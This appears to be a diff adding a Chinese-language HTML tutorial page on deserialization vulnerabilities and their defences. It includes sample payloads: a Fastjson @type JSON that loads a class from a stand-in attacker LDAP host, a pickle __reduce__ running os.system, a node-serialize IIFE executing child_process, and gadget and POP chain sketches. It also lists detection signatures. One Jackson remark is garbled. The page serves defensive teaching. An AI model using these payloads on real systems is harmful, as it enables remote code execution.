@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>二十分钟学透反序列化漏洞</title>
+<style>
+:root{
+  --bg:#F7F7F5; --card:#FFFFFF; --ink:#1A1A18; --muted:#6B6B66; --faint:#9A9A93;
+  --line:#E4E3DE; --accent:#185FA5; --accent-soft:#E6F1FB;
+  --ok:#0F6E56; --ok-soft:#E1F5EE; --warn:#854F0B; --warn-soft:#FAEEDA;
+  --danger:#A32D2D; --danger-soft:#FCEBEB; --violet:#534AB7; --violet-soft:#EEEDFE;
+  --code:#F1EFE8; --radius:12px;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;scroll-padding-top:70px}
+body{background:var(--bg);color:var(--ink);font-family:system-ui,-apple-system,"Segoe UI","Microsoft YaHei",sans-serif;font-size:15px;line-height:1.7;-webkit-font-smoothing:antialiased}
+code,pre,.mono{font-family:ui-monospace,"Cascadia Code",Consolas,"Courier New",monospace}
+#bar{position:fixed;top:0;left:0;height:3px;width:0;background:var(--accent);z-index:99;transition:width .1s linear}
+header{background:var(--card);border-bottom:1px solid var(--line);padding:44px 24px 34px}
+.wrap{max-width:900px;margin:0 auto;padding:0 24px}
+.serie{display:inline-block;font-size:12px;font-weight:600;letter-spacing:.5px;color:var(--violet);background:var(--violet-soft);padding:3px 11px;border-radius:999px;margin-bottom:14px}
+.density{display:flex;gap:8px;flex-wrap:wrap;margin-top:16px}
+.chip{font-size:12px;color:var(--muted);background:var(--bg);border:1px solid var(--line);border-radius:999px;padding:3px 11px}
+.chip b{color:var(--accent);font-weight:600}
+h1{font-size:29px;font-weight:600;letter-spacing:-.4px;line-height:1.3}
+.sub{color:var(--muted);margin-top:10px;font-size:15px}
+.sub b{color:var(--ink);font-weight:500}
+.timerbox{display:flex;align-items:center;gap:18px;flex-wrap:wrap;margin-top:24px;padding:16px 20px;background:var(--bg);border:1px solid var(--line);border-radius:var(--radius)}
+#clock{font-size:34px;font-weight:600;font-variant-numeric:tabular-nums;letter-spacing:1px;color:var(--accent);min-width:118px}
+#clock.done{color:var(--danger)}
+.btn{border:1px solid var(--line);background:var(--card);color:var(--ink);padding:7px 16px;border-radius:8px;font-size:14px;cursor:pointer;font-family:inherit;transition:.15s}
+.btn:hover{border-color:var(--accent);color:var(--accent)}
+.btn.primary{background:var(--accent);color:#fff;border-color:var(--accent)}
+.btn.primary:hover{opacity:.88;color:#fff}
+.timerhint{font-size:13px;color:var(--faint);flex:1;min-width:180px}
+main{padding:36px 0 80px}
+section{background:var(--card);border:1px solid var(--line);border-radius:var(--radius);padding:28px 30px;margin-bottom:20px}
+.shead{display:flex;align-items:center;gap:12px;margin-bottom:6px;flex-wrap:wrap}
+.mins{font-size:12px;font-weight:600;padding:3px 11px;border-radius:999px;background:var(--accent-soft);color:var(--accent);letter-spacing:.3px;white-space:nowrap}
+h2{font-size:20px;font-weight:600;letter-spacing:-.2px}
+h3{font-size:15px;font-weight:600;margin:22px 0 8px}
+h3:first-of-type{margin-top:16px}
+h4{font-size:14px;font-weight:600;margin:16px 0 4px;color:var(--muted)}
+p{color:#3A3A36;margin-top:10px}
+p.lead{color:var(--muted)}
+ul,ol{margin:10px 0 0 20px;color:#3A3A36}
+li{margin:6px 0}
+li::marker{color:var(--faint)}
+strong{font-weight:600;color:var(--ink)}
+.k{background:var(--code);border:1px solid var(--line);border-radius:5px;padding:1px 6px;font-size:13px;color:#7A3E00}
+pre{background:#2C2C2A;color:#E8E6E1;padding:14px 16px;border-radius:10px;overflow-x:auto;font-size:13px;line-height:1.65;margin-top:12px}
+pre .c{color:#8A8A82}
+pre .g{color:#9FE1CB}
+pre .y{color:#FAC775}
+pre .b{color:#85B7EB}
+pre .r{color:#F09595}
+.callout{border-left:3px solid var(--accent);background:var(--accent-soft);padding:12px 16px;border-radius:0 8px 8px 0;margin-top:16px;font-size:14px;color:#0C447C}
+.callout.warn{border-color:var(--warn);background:var(--warn-soft);color:#412402}
+.callout.ok{border-color:var(--ok);background:var(--ok-soft);color:#04342C}
+.callout.danger{border-color:var(--danger);background:var(--danger-soft);color:#501313}
+.callout b{font-weight:600}
+table{width:100%;border-collapse:collapse;margin-top:14px;font-size:14px;table-layout:fixed}
+th{text-align:left;font-weight:600;font-size:13px;color:var(--muted);padding:9px 12px;border-bottom:1px solid var(--line);background:var(--bg)}
+td{padding:11px 12px;border-bottom:1px solid var(--line);vertical-align:top;color:#3A3A36}
+tr:last-child td{border-bottom:none}
+td.f{font-family:ui-monospace,Consolas,monospace;font-size:12.5px;color:#7A3E00;word-break:break-all}
+.cmds{display:flex;flex-direction:column;gap:8px;margin-top:14px}
+.crow{display:flex;align-items:center;gap:12px;padding:10px 14px;background:var(--bg);border:1px solid var(--line);border-radius:9px;flex-wrap:wrap}
+.crow code{background:var(--code);border:1px solid var(--line);border-radius:5px;padding:3px 8px;font-size:13px;color:#7A3E00;white-space:nowrap;overflow-x:auto;max-width:100%}
+.crow .desc{font-size:13.5px;color:var(--muted);flex:1;min-width:150px}
+.copy{border:1px solid var(--line);background:var(--card);border-radius:6px;padding:3px 10px;font-size:12px;cursor:pointer;color:var(--muted);font-family:inherit}
+.copy:hover{border-color:var(--accent);color:var(--accent)}
+.copy.ok{border-color:var(--ok);color:var(--ok)}
+.steps{counter-reset:s;margin-top:14px}
+.step{display:flex;gap:14px;padding:12px 0;border-bottom:1px dashed var(--line)}
+.step:last-child{border-bottom:none}
+.step::before{counter-increment:s;content:counter(s);flex:0 0 26px;height:26px;border-radius:50%;background:var(--accent);color:#fff;font-size:13px;font-weight:600;display:flex;align-items:center;justify-content:center}
+.step .txt{flex:1;font-size:14.5px;color:#3A3A36}
+.step .txt b{color:var(--ink)}
+.cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(210px,1fr));gap:12px;margin-top:14px}
+.card{background:var(--bg);border:1px solid var(--line);border-radius:10px;padding:14px 16px}
+.card .ct{font-size:14px;font-weight:600;margin-bottom:5px;display:flex;align-items:center;gap:7px}
+.card .cd{font-size:13.5px;color:var(--muted);line-height:1.6}
+.dot{width:8px;height:8px;border-radius:50%;flex:0 0 8px}
+.quiz{margin-top:14px}
+.q{border:1px solid var(--line);border-radius:10px;padding:14px 16px;margin-bottom:10px}
+.q .qt{font-size:14.5px;font-weight:600;margin-bottom:8px}
+.opt{display:block;width:100%;text-align:left;padding:8px 12px;margin:5px 0;border:1px solid var(--line);background:var(--card);border-radius:8px;font-size:14px;cursor:pointer;font-family:inherit;color:#3A3A36;transition:.15s}
+.opt:hover{border-color:var(--accent)}
+.opt.right{border-color:var(--ok);background:var(--ok-soft);color:#04342C}
+.opt.wrong{border-color:var(--danger);background:var(--danger-soft);color:#501313}
+.ans{font-size:13.5px;color:var(--muted);margin-top:8px;display:none}
+.ans.show{display:block}
+.pit{display:flex;gap:14px;padding:14px 0;border-bottom:1px dashed var(--line)}
+.pit:last-child{border-bottom:none}
+.pit .num{flex:0 0 28px;height:28px;border-radius:8px;background:var(--danger-soft);color:var(--danger);font-size:13px;font-weight:600;display:flex;align-items:center;justify-content:center}
+.pit .pb{flex:1}
+.pit .pt{font-size:14.5px;font-weight:600}
+.pit .pd{font-size:13.5px;color:var(--muted);margin-top:3px}
+footer{text-align:center;color:var(--faint);font-size:13px;padding:0 24px 50px}
+@media(max-width:600px){
+  h1{font-size:23px} section{padding:22px 18px} header{padding:32px 0 26px}
+  .wrap{padding:0 16px} table{font-size:13px;table-layout:auto}
+  th,td{padding:8px 8px}
+}
+</style>
+</head>
+<body>
+<div id="bar"></div>
+
+<header>
+  <div class="wrap">
+    <span class="serie">20 分钟速学系列 · 安全篇 · 第 4 期 · 高密度版</span>
+    <h1>二十分钟学透反序列化漏洞</h1>
+    <p class="sub">反序列化是"把数据还原成对象"的日常操作，但它有一个致命属性：<b>还原过程会自动执行对象里的代码</b>。输入一旦不可信，还原数据就变成了执行命令。这篇把 Java、Fastjson、Python、PHP、Node 五套机制一次讲透，并给出各自能落地的防御。</p>
+    <div class="density">
+      <span class="chip">覆盖 <b>7</b> 大模块</span>
+      <span class="chip"><b>5</b> 种语言机制</span>
+      <span class="chip"><b>12</b> 段概念代码</span>
+      <span class="chip"><b>3</b> 层防御体系</span>
+      <span class="chip"><b>10</b> 个真实坑</span>
+      <span class="chip"><b>6</b> 道自测</span>
+    </div>
+    <div class="timerbox">
+      <div id="clock">20:00</div>
+      <button class="btn primary" id="start">开始计时</button>
+      <button class="btn" id="reset">重置</button>
+      <span class="timerhint" id="hint">建议先想清楚自己系统里有哪些"字节流变对象"的入口：RPC、缓存、Cookie、消息队列。</span>
+    </div>
+  </div>
+</header>
+
+<main class="wrap">
+
+<section id="s0">
+  <div class="shead"><span class="mins">开始前</span><h2>反序列化为什么危险</h2></div>
+  <p class="lead">一句话原理：<b>反序列化不是"读数据"，是"重建对象"，而重建过程会调用对象上的方法。</b>如果字节流来自不可信来源，攻击者就能精心构造对象图，让框架在"还原数据"时替他执行代码。</p>
+  <div class="steps">
+    <div class="step"><div class="txt"><b>自动触发：</b>Java 的 <span class="k">readObject()</span>、PHP 的 <span class="k">__wakeup()</span>/<span class="k">__destruct()</span>、Python 的 <span class="k">__reduce__()</span> 都是反序列化框架<b>自动调用</b>的钩子。开发者写这些方法时假设"只有我自己的数据会进来"，攻击者直接提供字节流，钩子照常触发。</div></div>
+    <div class="step"><div class="txt"><b>多语言通用：</b>这不是 Java 独有的问题。任何"把外部输入还原成对象/结构"的机制都有同类风险：Java <span class="k">ObjectInputStream</span>、Python <span class="k">pickle</span>、PHP <span class="k">unserialize()</span>、Node <span class="k">node-serialize</span>、Ruby <span class="k">Marshal</span>、.NET <span class="k">BinaryFormatter</span>。共性：输入可控 + 还原时执行代码。</div></div>
+    <div class="step"><div class="txt"><b>漏洞在接收端：</b>多数人以为"序列化是我们自己做的就安全"。实际上只要<b>反序列化的一端</b>会接收外部字节流（HTTP 参数、消息队列、缓存、Cookie、上传文件），风险就成立——数据可能在链路任何一环被篡改或注入。</div></div>
+  </div>
+  <div class="callout danger">
+    <b>先建立一个核心认知：</b><span class="k">JSON.parse</span> 是安全的——它只产生纯数据（字典、数组、字符串），不会执行对象方法。<b>不安全的是"带类型的反序列化"</b>：把 JSON/字节流还原成某个具体类的实例（Java 的 ObjectInputStream、Fastjson 的 autoType、PHP 的 unserialize）。JSON 数据格式本身无罪，有罪的是"顺便把类型信息也交给外部指定"。
+  </div>
+</section>
+
+<section id="s1">
+  <div class="shead"><span class="mins">模块 1</span><h2>通用原理与各语言入口</h2></div>
+  <p class="lead">所有反序列化漏洞共享同一个攻击模型：<b>构造一个对象图，使还原过程自动调用到危险方法</b>（执行命令、加载字节码、发起 JNDI 查询）。不同语言只是"自动触发点"不同。</p>
+  <table>
+    <tr><th style="width:130px">语言/库</th><th style="width:170px">危险入口</th><th>自动触发点</th></tr>
+    <tr><td><b>Java 原生</b></td><td class="f">ObjectInputStream.readObject()</td><td>readObject / readExternal / readResolve 回调</td></tr>
+    <tr><td><b>Java JSON 库</b></td><td class="f">Fastjson parseObject(@type)</td><td>setter / 构造器按类型实例化</td></tr>
+    <tr><td><b>Python</b></td><td class="f">pickle.loads() / marshal.loads()</td><td>__reduce__ 返回的可调用对象</td></tr>
+    <tr><td><b>PHP</b></td><td class="f">unserialize()</td><td>魔术方法 __wakeup/__destruct/__toString</td></tr>
+    <tr><td><b>Node</b></td><td class="f">node-serialize.unserialize()</td><td>IIFE 标记 _$$ND_FUNC$$_ 直接 eval</td></tr>
+    <tr><td><b>Ruby</b></td><td class="f">Marshal.load()</td><td>allocate + 初始化链</td></tr>
+    <tr><td><b>.NET</b></td><td class="f">BinaryFormatter.Deserialize()</td><td>类型解析与反序列化代理</td></tr>
+  </table>
+  <h3>三个判断问题（拿到一个入口先问自己）</h3>
+  <ol>
+    <li><b>这个字节流/字符串可能被外部控制吗？</b>HTTP 参数、Cookie、消息队列、共享缓存、文件上传——只要有一个环节攻击者能碰，答案就是"可能"。</li>
+    <li><b>反序列化时会执行对象上的方法吗？</b>带类型还原的原生序列化全是"会"；纯 JSON/XML 解析（无类型绑定）才是"不会"。</li>
+    <li><b>执行到的方法能触达危险操作吗？</b>反射调用、JNDI、类加载、模板引擎、命令执行——类库里这类"合法但可被组合"的方法就是 gadget。</li>
+  </ol>
+  <div class="callout warn">
+    <b>术语先对齐：</b><b>gadget（ gadgets ）</b>指类库中"本身合法、但在反序列化时能被恶意组合"的方法片段；<b>gadget chain</b> 指把多个 gadget 串成的调用链。Java 社区的 <b>ysoserial</b> 工具把这些链打包成了"输入一串字节、目标执行一条命令"的形态。<b>理解这一点很关键：攻击者不需要在你的代码里找漏洞，他只需要你的依赖里存在足够多的 gadget。</b>
+  </div>
+</section>
+
+<section id="s2">
+  <div class="shead"><span class="mins">模块 2</span><h2>Java 反序列化</h2></div>
+  <p class="lead">Java 原生序列化是这套漏洞的代名词：2015 年 Apache Commons Collections gadget 公开后，Java 反序列化连续多年位居 CWE 高危榜前列。</p>
+  <h3>1. 机制：readObject 是自动触发的钩子</h3>
+  <pre><span class="c">// 反序列化时，框架会自动调用对象上的 readObject（如果定义了）</span>
+<span class="b">public class</span> Payload <span class="b">implements</span> Serializable {
+    <span class="b">private void</span> readObject(ObjectInputStream in) {
+        in.defaultReadObject();
+        <span class="c">// 开发者以为这里只会处理"自己人"的数据</span>
+        Runtime.getRuntime().exec(<span class="s">"..."</span>);   <span class="c">// 但字节流可被外部构造</span>
+    }
+}
+<span class="c">// 注意：readObject 是 private 的，反序列化框架通过反射调用它 —— 这正是危险所在</span></pre>
+  <h3>2. Commons Collections gadget 链（概念级示意）</h3>
+  <pre><span class="c">// 核心思路：类库中的 Transformer 组合可以被"数据驱动"地拼成任意方法调用链</span>
+<span class="c">// Commons Collections 3.1/3.2.1 中的关键 gadget（概念级）：</span>
+Transformer[] chain = <span class="b">new</span> Transformer[]{
+    <span class="b">new</span> ConstantTransformer(Runtime.class),          <span class="c">// 1. 拿到 Class 对象</span>
+    <span class="b">new</span> InvokerTransformer(<span class="s">"getMethod"</span>, ...),   <span class="c">// 2. 反射查 getRuntime 方法</span>
+    <span class="b">new</span> InvokerTransformer(<span class="s">"invoke"</span>, ...),      <span class="c">// 3. 调用拿到 Runtime 实例</span>
+    <span class="b">new</span> InvokerTransformer(<span class="s">"exec"</span>, ...),        <span class="c">// 4. exec(命令)</span>
+};
+<span class="b">new</span> ChainedTransformer(chain);   <span class="c">// 串成一个 Transformer</span>
+
+<span class="c">// 然后把它藏进 LazyMap/TransformedMap 等"反序列化时会触发 transform 的值"里，</span>
+<span class="c">// 序列化成字节流。目标反序列化时链自动执行 → RCE。</span>
+<span class="c">// 真实利用由 ysoserial 一键生成，但上面的四步就是全部原理。</span></pre>
+  <div class="callout warn">
+    <b>为什么 Java 生态反复中招：</b>gadget 藏在<b>依赖库</b>里而不是业务代码里——你的代码什么都没写错，但只要 classpath 上有 Commons Collections、Groovy、C3P0、Rome、Spring 的某些版本，链就存在。<b>这就是为什么"升级依赖 + 反序列化白名单"必须双管齐下。</b>JDK 自带的 <span class="k">AnnotationInvocationHandler</span> 等类也能当 gadget 起点，所以单纯升级 JDK 不够。
+  </div>
+  <h3>3. JDK 层面的防御：JEP 290</h3>
+  <ul>
+    <li><b>JEP 290（JDK 9+ 内置；JDK 8u121 / 7u131 / 6u141 回溯移植）</b>给 ObjectInputStream 加了<b>序列化过滤</b>机制：反序列化时按类名/类路径图做白名单或黑名单校验，超范围直接拒绝。</li>
+    <li><b>配置方式：</b>系统属性 <span class="k">jdk.serialFilter</span>（全局，如 <span class="k">-Djdk.serialFilter=maxdepth=100;java.*;!*</span> 形式按需配置），或 <span class="k">ObjectInputFilter</span> API 按流设置。</li>
+    <li><b>局限：</b>JEP 290 是<b>缓解不是根治</b>——它按类名过滤，类名混淆/变形的绕过手法长期存在，且默认配置并非白名单模式。<b>不能把"升了 JDK"当成修复完成。</b></li>
+  </ul>
+  <h3>4. 应用层白名单（最可靠的自持方案）</h3>
+  <pre><span class="c">// 方式一：继承 ObjectInputStream，在 resolveClass 里做类白名单</span>
+<span class="b">public class</span> SafeObjectInputStream <span class="b">extends</span> ObjectInputStream {
+    <span class="b">private static final</span> Set&lt;String&gt; ALLOWED = Set.of(
+        <span class="s">"com.example.OrderMessage"</span>, <span class="s">"java.util.ArrayList"</span>, <span class="s">"java.lang.Number"</span>);
+    <span class="b">public</span> SafeObjectInputStream(InputStream in) <span class="b">throws</span> IOException { <span class="b">super</span>(in); }
+    <span class="b">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="b">throws</span> IOException {
+        <span class="b">if</span> (!ALLOWED.contains(desc.getName())) {
+            <span class="b">throw new</span> InvalidObjectException(<span class="s">"非白名单类: "</span> + desc.getName());
+        }
+        <span class="b">return super</span>.resolveClass(desc);
+    }
+}
+
+<span class="c">// 方式二：Apache Commons IO 的 ValidatingObjectInputStream</span>
+<span class="b">new</span> ValidatingObjectInputStream(in).accept(OrderMessage.class, ArrayList.class);</pre>
+  <div class="callout ok">
+    <b>Java 反序列化防护的正确顺序：</b>① <b>能不用就不用</b>——跨服务传数据换 JSON/protobuf/gRPC（这是根治，也是本篇最重要的建议）；② 必须用的地方上<b>类白名单</b>（SafeObjectInputStream），只放行业务 DTO，一个 gadget 类都不放；③ 全局配 <span class="k">jdk.serialFilter</span> 兜底 + 升级依赖消除已知 gadget；④ 入口加<b>完整性校验</b>（HMAC 签名），字节流被改过直接拒。
+  </div>
+</section>
+
+<section id="s3">
+  <div class="shead"><span class="mins">模块 3</span><h2>Fastjson：autoType 的十年攻防</h2></div>
+  <p class="lead">Fastjson 的问题不在 JSON，在它特有的 <b>autoType</b> 特性：允许在 JSON 里用 <span class="k">@type</span> 字段<b>指定反序列化目标类</b>——等于把"类型"这个决定权交给了外部输入。</p>
+  <h3>1. 攻击形态</h3>
+  <pre><span class="c">// 攻击者提交的 JSON：用 @type 指定一个"有危险 setter/构造行为"的类</span>
+{
+  <span class="s">"@type"</span>: <span class="s">"com.sun.rowset.JdbcRowSetImpl"</span>,
+  <span class="s">"dataSourceName"</span>: <span class="s">"ldap://attacker.com/exp"</span>,
+  <span class="s">"autoCommit"</span>: true
+}
+<span class="c">// fastjson 按 @type 实例化该类，随后调用其 setter</span>
+<span class="c">// setDataSourceName 内部会触发 JNDI 查询 → 从远程 LDAP 加载恶意类 → RCE</span>
+<span class="c">// 同类思路的还有 TemplatesImpl（字节码加载）、各种日志/连接池类的危险 setter</span></pre>
+  <h3>2. 版本与状态（选型时直接查这个表）</h3>
+  <table>
+    <tr><th style="width:150px">版本线</th><th style="width:200px">状态</th><th>建议</th></tr>
+    <tr><td class="f">≤ 1.2.24</td><td>autoType 默认开启，漏洞密集爆发期</td><td><b>必须升级</b>，历史漏洞编号两位数</td></tr>
+    <tr><td class="f">1.2.25 ~ 1.2.47</td><td>默认关闭 autoType，但存在多轮绕过</td><td>升级，且审计是否有人手动开启</td></tr>
+    <tr><td class="f">1.2.68 ~ 1.2.80</td><td>引入 safeMode、checkAutotype 缓存与类黑名单</td><td>继续升级；黑名单式防御有滞后性</td></tr>
+    <tr><td class="f">≥ 1.2.83 / fastjson2</td><td>默认更严格，autoType 需显式开启且默认白名单化</td><td><b>新项目直接用 fastjson2</b>；老版本尽快升到 1.2.83+</td></tr>
+  </table>
+  <h3>3. 修复措施</h3>
+  <ul>
+    <li><b>升级</b>到 1.2.83+ 或迁移 fastjson2——这是性价比最高的一步。</li>
+    <li><b>关闭 autoType</b>：不开启 <span class="k">ParserConfig.setAutoTypeSupport(true)</span>；如果业务必须用，配<b>autotype 白名单</b>（只放行自己的 DTO 类）。</li>
+    <li><b>输入侧过滤</b>：对不可信 JSON 检查是否含 <span class="k">@type</span> 字段，出现即拒绝或剥离。</li>
+    <li><b>依赖层</b>：确保 classpath 上没有 JNDI 可利用类（或升级相关依赖）；禁用远程 LDAP 可由 JVM 参数缓解。</li>
+  </ul>
+  <div class="callout danger">
+    <b>Fastjson 类漏洞的通用教训：</b>"<b>让数据携带类型信息，并由数据指定类型</b>"是这类漏洞的总根源。选型时问一句：<b>解析 JSON 时能不能被外部指定实例化哪个类？</b>能，就有 fastjson 同款风险；不能（如 Gson、Jackson 默认配置、原生 JSON.parse），这条攻击面就不存在。<b>Jackson 的开机关联是 disableDeserializationFeature，别把 @type 式功能随意打开。</b>
+  </div>
+</section>
+
+<section id="s4">
+  <div class="shead"><span class="mins">模块 4</span><h2>Python pickle</h2></div>
+  <p class="lead">pickle 的设计目标就是"完整还原 Python 对象"，还原机制通过 <span class="k">__reduce__</span> 协议委托给一个可调用对象——<b>这个可调用对象可以是任何函数，包括 os.system</b>。对不可信数据调用 <span class="k">pickle.loads()</span> 等于直接执行代码。</p>
+  <pre><span class="c"># 恶意序列化载荷的构造（概念级，演示原理）</span>
+<span class="b">import</span> pickle, os
+
+<span class="b">class</span> Evil:
+    <span class="b">def</span> __reduce__(self):
+        <span class="c"># 反序列化时框架会自动执行这个返回的 (可调用对象, 参数)</span>
+        <span class="b">return</span> (os.system, (<span class="s">"id"</span>,))
+
+payload = pickle.dumps(Evil())
+<span class="c"># payload 是一串字节。任何拿到它并调用 pickle.loads(payload) 的进程都会执行 id 命令</span>
+
+<span class="c"># 危险场景：Celery/RabbitMQ 任务体、Redis 缓存、Django session、模型权重文件</span>
+<span class="c"># 这些场景的数据一旦可被外部写入或篡改，pickle.loads 就是 RCE 入口</span></pre>
+  <h3>检测与修复</h3>
+  <table>
+    <tr><th style="width:150px">检测方法</th><th>修复措施</th></tr>
+    <tr><td>代码审计 <span class="k">pickle.loads/marshal.loads</span> 的入参来源</td><td><b>跨边界传数据一律用 JSON</b>（json.loads 只产生纯数据）</td></tr>
+    <tr><td>检查 Redis/RabbitMQ 里存储对象的序列化格式</td><td>确实需要 pickle 的场景：<b>HMAC 签名后再 loads</b>，验签失败直接拒</td></tr>
+    <tr><td>检查 PyYAML 是否用了 <span class="k">yaml.load</span>（同样能构造任意对象）</td><td>YAML 用 <span class="k">yaml.safe_load</span>；永远不用 yaml.load 处理不可信输入</td></tr>
+    <tr><td>模型/权重文件来源是否可信</td><td>第三方 .pkl/.pt 文件先沙箱加载，勿直接 pickle.loads</td></tr>
+  </table>
+  <div class="callout warn">
+    <b>同类陷阱不止 pickle：</b><span class="k">marshal</span> 同样能执行代码；<span class="k">yaml.load</span> 可构造任意 Python 对象（包括危险构造器）；<span class="k">eval</span>/<span class="k">exec</span> 处理 JSON 字符串则是另一类经典错误。<b>共同点是：把"字符串/字节"变成"可执行对象"的接口，都要当代码执行看待。</b>
+  </div>
+</section>
+
+<section id="s5">
+  <div class="shead"><span class="mins">模块 5</span><h2>PHP 反序列化与 POP 链</h2></div>
+  <p class="lead">PHP 的 <span class="k">unserialize()</span> 会按字符串里的类名重建对象，并自动触发魔术方法。PHP 生态把这类利用叫 <b>POP 链（Property Oriented Programming）</b>——和 Java gadget chain 同一思想：串联多个类的魔术方法，一步步走到危险函数。</p>
+  <h3>自动触发点：魔术方法</h3>
+  <table>
+    <tr><th style="width:150px">魔术方法</th><th>触发时机</th></tr>
+    <tr><td class="f">__wakeup()</td><td>unserialize 重建对象时立即调用</td></tr>
+    <tr><td class="f">__destruct()</td><td>对象被销毁时（脚本结束或 unset）调用</td></tr>
+    <tr><td class="f">__toString()</td><td>对象被当作字符串使用时（如 echo、拼接）调用</td></tr>
+    <tr><td class="f">__call()</td><td>调用不存在的方法时回调</td></tr>
+  </table>
+  <pre><span class="c">// POP 链的概念级示意（各步骤都"看起来合法"）</span>
+<span class="b">class</span> LogWriter {
+    <span class="b">public</span> $filename = <span class="s">'/tmp/app.log'</span>;
+    <span class="b">public function</span> __destruct() {
+        file_put_contents($<span class="b">this</span>-&gt;filename, <span class="s">'...'</span>);   <span class="c">// 1. 析构即写文件</span>
+    }
+}
+<span class="b">class</span> FileHelper {
+    <span class="b">public</span> $path;
+    <span class="b">public function</span> __toString() {
+        <span class="b">return</span> file_get_contents($<span class="b">this</span>-&gt;path);          <span class="c">// 2. 当字符串用即读文件</span>
+    }
+}
+<span class="b">class</span> View {
+    <span class="b">public</span> $tpl;
+    <span class="b">public function</span> __destruct() {
+        <span class="b">echo</span> $<span class="b">this</span>-&gt;tpl;   <span class="c">// 3. echo 一个对象 → 触发其 __toString</span>
+    }
+}
+<span class="c">// 攻击者构造序列化字符串：View.tpl = FileHelper(path='/etc/passwd')</span>
+<span class="c">// unserialize 后 View 析构 → echo 触发 FileHelper.__toString → 读出任意文件内容</span>
+<span class="c">// 若链尾是 call_user_func/system 之类，即 RCE —— WordPress 等生态历史漏洞多为此类</span></pre>
+  <h3>检测与修复</h3>
+  <ul>
+    <li><b>入口排查：</b>审计所有 <span class="k">unserialize()</span> 调用——Cookie、缓存、API 参数、模板变量，入参是否可能来自用户。</li>
+    <li><b>替代方案：</b>跨边界/用户侧数据一律 <span class="k">json_decode</span>（纯数据，无对象重建）。</li>
+    <li><b>必须 unserialize 时：</b>先验签（HMAC）+ 对可接受类做白名单（PHP 7.4+ 可在 unserialize 第二个参数传 <span class="k">allowed_classes</span>，设为 false 即全部拒绝）。</li>
+    <li><b>框架侧：</b>升级 CMS/框架及插件——历史 pop 链大量存在于旧版 WordPress 插件与框架组件中。</li>
+  </ul>
+  <div class="callout ok">
+    <b>PHP 的一个原生便利：</b><span class="k">unserialize($data, ['allowed_classes' =&gt; false])</span> 可以一行关闭"类重建"，只还原数组/标量。很多场景（存配置、存数组）根本不需要还原成对象，<b>这个参数应该成为团队编码规范里的默认项</b>。
+  </div>
+</section>
+
+<section id="s6">
+  <div class="shead"><span class="mins">模块 6</span><h2>Node.js node-serialize 与 JSON 边界</h2></div>
+  <p class="lead">node-serialize 曾经是 Node 生态最流行的序列化库之一，它的 <span class="k">unserialize()</span> 为了支持函数序列化，引入了 IIFE 立即执行标记——<b>这个标记在 JSON 数据里出现，等价于 eval</b>。</p>
+  <pre><span class="c">// node-serialize 的载荷形态（概念级）：IIFE 标记包裹任意 JS</span>
+<span class="c">// 序列化函数时会产生这样的"数据"：</span>
+<span class="s">"{\"__type\":\"_$$ND_FUNC$$_function(){ return require('child_process').exec('id'); }()\"}"</span>
+
+<span class="c">// unserialize 时检测到 _$$ND_FUNC$$_ 标记 → 把里面内容当代码 eval</span>
+<span class="c">// 于是"还原数据"变成"执行任意 JS" —— 典型触发场景：Cookie、session、Redis 缓存</span>
+
+<span class="c">// 对比：JSON.parse 只还原纯数据，永远安全</span>
+JSON.parse(<span class="s">'{"a":1}'</span>);        <span class="c">// ✓ 只有数据，没有代码执行路径</span>
+eval(<span class="s">'(' + userInput + ')'</span>);     <span class="c">// ✗ 字符串变代码，同类错误的另一种写法</span></pre>
+  <h3>检测与修复</h3>
+  <table>
+    <tr><th style="width:150px">检测方法</th><th>修复措施</th></tr>
+    <tr><td>搜依赖里的 <span class="k">node-serialize</span>、<span class="k">serialize-to-js</span> 类库</td><td><b>移除 node-serialize</b>（官方已不维护），统一用 JSON</td></tr>
+    <tr><td>检查 Cookie/session/缓存里是否出现 <span class="k">_$$ND_FUNC$$_</span></td><td>反序列化入口加特征检测，命中即拒绝并告警</td></tr>
+    <tr><td>审计任何 eval/new Function 处理外部字符串的代码</td><td>用 JSON.parse + 显式类型校验；函数序列化需求用安全替代方案</td></tr>
+  </table>
+  <div class="callout warn">
+    <b>JSON 边界的正确认知：</b>JSON 数据格式本身没有"类型指定"能力，所以 JSON.parse 安全；<b>危险的是"在 JSON 里塞类型字段并让库据此实例化类"的约定</b>——Fastjson 的 <span class="k">@type</span> 是这个坑的 Java 版，node-serialize 的函数标记是这个坑的 JS 版。<b>选型标准：解析器是否允许输入指定要实例化的类型/代码。允许，就要当代码执行面来防。</b>
+  </div>
+</section>
+
+<section id="s7">
+  <div class="shead"><span class="mins">模块 7</span><h2>防御体系：三层纵深</h2></div>
+  <p class="lead">反序列化防御没有银弹，但分层做全，风险可控。按优先级从根治到兜底分三层。</p>
+  <table>
+    <tr><th style="width:130px">层级</th><th style="width:250px">措施</th><th>要点</th></tr>
+    <tr><td><b>L1 协议层（根治）</b></td><td>不用原生序列化：跨服务/跨边界一律 JSON、protobuf、MessagePack 等<b>纯数据格式</b></td><td>消灭"输入指定类型"的可能，是唯一能根治的一层。旧系统迁移成本高，但收益最大</td></tr>
+    <tr><td><b>L2 入口层（核心）</b></td><td>白名单 + 签名：类白名单（Java resolveClass / PHP allowed_classes）；字节流 HMAC 签名验签</td><td>白名单只放行业务 DTO；签名防篡改，密钥入 KMS</td></tr>
+    <tr><td><b>L3 运行时（兜底）</b></td><td>JEP 290 过滤 + 依赖升级消除 gadget + RASP 运行时 Hook</td><td>JEP 290 全局配 jdk.serialFilter；RASP 在 readObject/resolveClass 处检测异常类</td></tr>
+  </table>
+  <h3>检测与监控（运行时发现攻击）</h3>
+  <div class="cmds">
+    <div class="crow"><code>ac ed 00 05</code><span class="desc">Java 序列化魔数，流量/日志里出现即高危信号（Base64 形态常以 rO0AB 开头）</span><button class="copy">复制</button></div>
+    <div class="crow"><code>_$$ND_FUNC$$_</code><span class="desc">node-serialize IIFE 标记，出现在请求/Cookie 里即尝试利用</span><button class="copy">复制</button></div>
+    <div class="crow"><code>O:数字:"类名"</code><span class="desc">PHP 序列化字符串的对象头部特征，正常 JSON 接口不该出现</span><button class="copy">复制</button></div>
+    <div class="crow"><code>grep -rn "pickle.loads\|unserialize(\|readObject(" src/</code><span class="desc">代码审计入口，逐个确认入参来源与防护</span><button class="copy">复制</button></div>
